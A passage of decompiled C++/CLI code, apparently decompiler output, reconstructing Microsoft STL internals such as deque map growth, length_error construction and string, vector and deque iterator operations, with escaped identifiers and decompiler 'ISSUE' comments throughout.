        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) &lengthError);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref lengthError = (int) &\u003CModule\u003E.\u003F\u003F_7length_error\u0040std\u0040\u00406B\u0040;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Elogic_error\u002E\u007Bdtor\u007D), (void*) &lengthError);
      }
      \u003CModule\u003E._CxxThrowException((void*) &lengthError, &\u003CModule\u003E._TI3\u003FAVlength_error\u0040std\u0040\u0040);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar);
    }
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool std\u002E_String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u0021\u003D(
    [In] _String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    _String_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* _Right)
  {
    uint num1 = (uint) *(int*) obj0;
    int num2;
    switch (num1)
    {
      case 0:
        num2 = 0;
        break;
      case 4294967292:
label_5:
        return *(int*) ((IntPtr) obj0 + 4) != *(int*) ((IntPtr) _Right + 4);
      default:
        num2 = 1;
        break;
    }
    if ((byte) num2 == (byte) 0 || (int) num1 != *(int*) _Right)
    {
      \u003CModule\u003E._invalid_parameter_noinfo();
      goto label_5;
    }
    else
      goto label_5;
  }

  internal static unsafe void std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Growmap(
    [In] deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* obj0,
    uint _Count)
  {
    uint num1 = (uint) *(int*) ((IntPtr) obj0 + 20);
    if (153391689U - num1 < _Count)
      \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Xlen();
    uint num2 = num1 >> 1;
    if (num2 < 8U)
      num2 = 8U;
    if (_Count < num2 && num1 <= 153391689U - num2)
      _Count = num2;
    uint num3 = (uint) *(int*) ((IntPtr) obj0 + 24);
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** _Dest1 = \u003CModule\u003E.std\u002Eallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E\u002Eallocate((allocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E*) ((IntPtr) obj0 + 8), num1 + _Count);
    int num4 = *(int*) ((IntPtr) obj0 + 16);
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** _Dest2 = \u003CModule\u003E.stdext\u002Eunchecked_uninitialized_copy\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Aallocator\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E\u0020\u003E((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) (num4 + (int) num3 * 4), (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) (*(int*) ((IntPtr) obj0 + 20) * 4 + num4), (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) ((int) num3 * 4 + (IntPtr) _Dest1), (allocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E*) ((IntPtr) obj0 + 8));
    if (num3 <= _Count)
    {
      uint num5 = _Count - num3;
      int _First = *(int*) ((IntPtr) obj0 + 16);
      basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** stdAllocatorWcharTPtr = \u003CModule\u003E.stdext\u002Eunchecked_uninitialized_copy\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Aallocator\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E\u0020\u003E((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) _First, (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) (_First + (int) num3 * 4), _Dest2, (allocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E*) ((IntPtr) obj0 + 8));
      if (0U < num5)
      {
        // ISSUE: initblk instruction
        __memset((IntPtr) stdAllocatorWcharTPtr, 0, (int) num5 << 2);
      }
      if (0U < num3)
      {
        // ISSUE: initblk instruction
        __memset((IntPtr) _Dest1, 0, (int) num3 << 2);
      }
    }
    else
    {
      int _First = *(int*) ((IntPtr) obj0 + 16);
      \u003CModule\u003E.stdext\u002Eunchecked_uninitialized_copy\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Aallocator\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E\u0020\u003E((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) _First, (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) ((int) _Count * 4 + _First), _Dest2, (allocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E*) ((IntPtr) obj0 + 8));
      int num6 = *(int*) ((IntPtr) obj0 + 16);
      basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** stdAllocatorWcharTPtr = \u003CModule\u003E.stdext\u002Eunchecked_uninitialized_copy\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Aallocator\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E\u0020\u003E((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) ((int) _Count * 4 + num6), (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) (num6 + (int) num3 * 4), _Dest1, (allocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E*) ((IntPtr) obj0 + 8));
      if (0U < _Count)
      {
        // ISSUE: initblk instruction
        __memset((IntPtr) stdAllocatorWcharTPtr, 0, (int) _Count << 2);
      }
    }
    int num7 = *(int*) ((IntPtr) obj0 + 16);
    if (num7 != 0)
      \u003CModule\u003E.delete((void*) num7);
    *(int*) ((IntPtr) obj0 + 16) = (int) _Dest1;
    *(int*) ((IntPtr) obj0 + 20) = *(int*) ((IntPtr) obj0 + 20) + (int) _Count;
  }

  internal static unsafe sbyte std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Peek(
    [In] istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0)
  {
    uint num1 = (uint) *(int*) obj0;
    if (num1 != 0U)
    {
      int num2 = \u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esgetc((basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) num1);
      if (!\u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(&-1, &num2))
      {
        *(sbyte*) ((IntPtr) obj0 + 5) = \u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eto_char_type(&num2);
        goto label_4;
      }
    }
    *(int*) obj0 = 0;
label_4:
    *(sbyte*) ((IntPtr) obj0 + 4) = (sbyte) 1;
    return *(sbyte*) ((IntPtr) obj0 + 5);
  }

  internal static unsafe void std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Sentry_base\u002E\u007Bdtor\u007D(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E._Sentry_base* obj0)
  {
    int num1 = *(int*) obj0;
    if ((IntPtr) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) num1 + 4) + num1)) == IntPtr.Zero)
      return;
    int num2 = *(int*) obj0;
    \u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Unlock(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) num2 + 4) + num2)));
  }

  [SpecialName]
  internal static unsafe length_error* std\u002Elength_error\u002E\u007Bctor\u007D(
    [In] length_error* obj0,
    length_error* _param1)
  {
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) obj0, (exception*) _param1);
    // ISSUE: fault handler
    try
    {
      *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12), (basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) _param1 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    // ISSUE: fault handler
    try
    {
      *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7length_error\u0040std\u0040\u00406B\u0040;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Elogic_error\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    return obj0;
  }

  internal static unsafe char* std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Ufill(
    [In] vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    char* _Ptr,
    uint _Count,
    char* _Val)
  {
    uint num = _Count;
    char* chPtr = _Ptr;
    if (0U < _Count)
    {
      do
      {
        *chPtr = *_Val;
        --num;
        ++chPtr;
      }
      while (num > 0U);
    }
    return (char*) ((int) _Count * 2 + (IntPtr) _Ptr);
  }

  internal static unsafe _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002E_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u003D(
    [In] _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    int _Off)
  {
    if ((*(int*) obj0 != 0 ? 1 : 0) == 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    uint num1 = (uint) *(int*) obj0;
    _Container_base_aux* containerBaseAuxPtr1 = num1 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num1;
    uint num2 = (uint) (_Off * 2);
    uint num3 = (uint) *(int*) ((IntPtr) obj0 + 4) + num2;
    if (num3 <= (uint) *(int*) ((IntPtr) containerBaseAuxPtr1 + 16))
    {
      _Container_base_aux* containerBaseAuxPtr2 = num1 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num1;
      if (num3 >= (uint) *(int*) ((IntPtr) containerBaseAuxPtr2 + 12))
        goto label_5;
    }
    \u003CModule\u003E._invalid_parameter_noinfo();
label_5:
    *(int*) ((IntPtr) obj0 + 4) = *(int*) ((IntPtr) obj0 + 4) + (int) num2;
    return obj0;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool std\u002E_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u0021\u003D(
    [In] _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* _Right)
  {
    uint num = (uint) *(int*) obj0;
    if ((num != 0U ? 1 : 0) == 0 || (int) num != *(int*) _Right)
      \u003CModule\u003E._invalid_parameter_noinfo();
    return *(int*) ((IntPtr) obj0 + 4) != *(int*) ((IntPtr) _Right + 4);
  }

  internal static unsafe void std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Xlen()
  {
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BC\u0040KBDMBKEH\u0040deque\u003F\u0024DMT\u003F\u0024DO\u003F5too\u003F5long\u003F\u0024AA\u0040);
    // ISSUE: fault handler
    try
    {
      length_error lengthError;
      \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) &lengthError);
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref lengthError = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &lengthError + 12), &stdAllocatorChar);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) &lengthError);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref lengthError = (int) &\u003CModule\u003E.\u003F\u003F_7length_error\u0040std\u0040\u00406B\u0040;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Elogic_error\u002E\u007Bdtor\u007D), (void*) &lengthError);
      }
      \u003CModule\u003E._CxxThrowException((void*) &lengthError, &\u003CModule\u003E._TI3\u003FAVlength_error\u0040std\u0040\u0040);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar);
    }
  }

  internal static unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** std\u002Eallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E\u002Eallocate(
    [In] allocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E* obj0,
    uint _Count)
  {
    uint num = _Count;
    if (_Count <= 0U)
      num = 0U;
    else if (uint.MaxValue / _Count < 4U)
    {
      sbyte* numPtr = (sbyte*) 0;
      bad_alloc badAlloc;
      \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) &badAlloc, &numPtr);
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref badAlloc = (int) &\u003CModule\u003E.\u003F\u003F_7bad_alloc\u0040std\u0040\u00406B\u0040;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) &badAlloc);
      }
      \u003CModule\u003E._CxxThrowException((void*) &badAlloc, &\u003CModule\u003E._TI2\u003FAVbad_alloc\u0040std\u0040\u0040);
    }
    return (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E**) \u003CModule\u003E.@new(num << 2);
  }

  internal static unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002E_Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E\u002E\u002A(
    [In] _Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E* obj0)
  {
    uint num1 = (uint) *(int*) ((IntPtr) obj0 + 4);
    if ((*(int*) obj0 != 0 ? 1 : 0) == 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    uint num2 = (uint) *(int*) obj0;
    _Container_base_aux* containerBaseAuxPtr1 = num2 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num2;
    _Container_base_aux* containerBaseAuxPtr2 = num2 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num2;
    if ((uint) *(int*) ((IntPtr) obj0 + 4) >= (uint) (*(int*) ((IntPtr) containerBaseAuxPtr2 + 28) + *(int*) ((IntPtr) containerBaseAuxPtr1 + 24)))
      \u003CModule\u003E._invalid_parameter_noinfo();
    uint num3 = (uint) *(int*) obj0;
    if ((uint) *(int*) ((num3 == 0U ? 0 : *(int*) num3) + 20) <= num1)
    {
      _Container_base_aux* containerBaseAuxPtr3 = num3 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num3;
      num1 -= (uint) *(int*) ((IntPtr) containerBaseAuxPtr3 + 20);
    }
    _Container_base_aux* containerBaseAuxPtr4 = num3 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num3;
    return (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) *(int*) ((int) num1 * 4 + *(int*) ((IntPtr) containerBaseAuxPtr4 + 16));
  }

  internal static unsafe _Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E* std\u002E_Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E\u002E\u002B\u003D(
